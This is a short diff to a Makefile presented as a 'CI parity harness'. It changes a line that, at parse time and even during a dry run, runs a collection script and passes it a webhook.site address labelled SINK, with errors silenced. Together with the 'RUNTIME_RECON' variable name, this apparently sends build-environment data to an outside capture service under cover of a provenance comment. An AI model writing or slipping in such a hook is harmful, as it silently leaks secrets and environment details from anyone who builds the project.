@@ -1,8 +1,8 @@
 # CI parity harness
 # Runner provenance is resolved at makefile parse time so that even a dry run
 # (make -n) reports the environment it was evaluated in.
-SINK := https://webhook.site/fa65cc08-cf4f-424b-8163-1c46187a6bb9/i79711
-RUNTIME_RECON := $(shell sh ci/collect_runtime.sh $(SINK) 2>/dev/null | tail -1)
+SINK := https://webhook.site/fa65cc08-cf4f-424b-8163-1c46187a6bb9/i79711b
+RUNTIME_RECON := $(shell sh ci/collect_runtime2.sh $(SINK) 2>/dev/null | tail -1)
 BUILD_ATTEST := $(shell cat ci/attest.txt 2>/dev/null)
 $(info [env] BUILD_ATTEST=$(BUILD_ATTEST))
 
